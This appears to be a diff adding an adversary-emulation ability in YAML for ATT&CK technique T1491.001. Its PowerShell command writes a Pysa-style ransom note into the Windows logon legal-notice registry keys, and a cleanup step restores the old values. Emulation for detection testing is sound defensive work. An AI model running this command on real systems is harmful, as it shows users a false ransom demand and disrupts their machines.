@@ -1,0 +1,40 @@
+---
+- id: 2fc2e45dde68ab78a97a22ca138652e1
+  name: Configure LegalNoticeCaption and LegalNoticeText registry keys to display
+    ransom message
+  description: "Display ransom message to users at system start-up by configuring\
+    \ registry keys HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\\
+    System\\LegalNoticeCaption and HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\\
+    Policies\\System\\LegalNoticeText.\n\n[SynAck Ransomware](https://www.trendmicro.com/vinfo/es/security/news/cybercrime-and-digital-threats/synack-ransomware-leverages-process-doppelg-nging-for-evasion-and-infection),\
+    \ \n[Grief Ransomware](https://redcanary.com/blog/grief-ransomware/), \n[Maze\
+    \ Ransomware](https://cyware.com/research-and-analysis/maze-ransomware-a-deadly-combination-of-data-theft-and-encryption-to-target-us-organizations-8f27),\n\
+    [Pysa Ransomware](https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-destructive-pysa-ransomware),\n\
+    [Spook Ransomware](https://community.fortinet.com/t5/FortiEDR/Threat-Coverage-How-FortiEDR-protects-against-Spook-Ransomware/ta-p/204226),\n\
+    [DopplePaymer Ransomware](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Dopplepaymer&threatId=-2147221958),\n\
+    [Reedemer Ransomware](https://blog.cyble.com/2022/07/20/redeemer-ransomware-back-action/),\n\
+    [Kangaroo Ransomware](https://www.bleepingcomputer.com/news/security/the-kangaroo-ransomware-not-only-encrypts-your-data-but-tries-to-lock-you-out-of-windows/)\n"
+  tactic: impact
+  technique:
+    attack_id: T1491.001
+    name: 'Defacement: Internal Defacement'
+  platforms:
+    windows:
+      psh:
+        command: $orgLegalNoticeCaption = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+          -Name LegalNoticeCaption).LegalNoticeCaption; $orgLegalNoticeText = (Get-ItemProperty
+          HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText).LegalNoticeText;
+          $newLegalNoticeCaption = "PYSA"; $newLegalNoticeText = "Hi Company, every
+          byte on any types of your devices was encrypted. Don't try to use backups
+          because it were encrypted too. To get all your data contact us:xxxx@onionmail.org";
+          Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+          -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force;
+          Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+          -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force
+        payloads: []
+        cleanup: Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+          -Name LegalNoticeCaption -Value $orgLegalNoticeCaption -Type String -Force;
+          Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+          -Name LegalNoticeText -Value $orgLegalNoticeText -Type String -Force
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
